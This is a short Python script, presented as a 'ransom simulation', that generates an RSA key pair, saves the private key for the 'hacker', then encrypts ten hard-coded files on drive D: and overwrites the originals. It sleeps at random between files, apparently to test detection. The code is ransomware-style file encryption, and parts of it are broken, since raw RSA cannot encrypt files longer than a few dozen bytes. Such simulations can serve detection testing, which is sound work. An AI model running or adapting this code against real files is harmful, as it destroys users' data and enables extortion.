import time
import random

import sys
sys.path.append('C:\\Users\\Admin\\AppData\\Roaming\\Python\\Python311\\site-packages')
import rsa

print("this is ransom simulation -> rsa-pub-key file encrypting...")
#==================================================
# 1. rsa gen keys (privkey save to file)

# 1.1 - Generate a public and private key
(public_key, private_key) = rsa.newkeys(1024)

# 1.2 Save the private key to a file --> hacker keep this
private_key_file_path = 'D:\\private_key.pem'

with open(private_key_file_path, 'wb') as f:
    pem = private_key.save_pkcs1('PEM')
    f.write(pem)
    print("private key saved to: ", private_key_file_path)

#==================================================
# 2. encrypt the list file (ransome acts.)

file_paths = [
    'D:\\input1.txt',
    'D:\\input2.txt',
    'D:\\input3.txt',
    'D:\\input4.txt',
    'D:\\input5.txt',
    'D:\\input6.txt',
    'D:\\input7.txt',
    'D:\\input8.txt',
    'D:\\input9.txt',
    'D:\\input10.txt'
    # Add more file paths as needed
]

encrypted_contents = ""

for file_path in file_paths:
  # random sleep for detecting
  time.sleep(random.uniform(3, 6))

  with open(file_path, 'rb') as file:
    file_contents = file.read()
    
    # Encrypt the file contents
    encrypted_contents = rsa.encrypt(file_contents, public_key)
    print("file ecrypted to: ")
    print(encrypted_contents)

  with open(file_path, 'wb') as f:
    f.write(encrypted_contents)


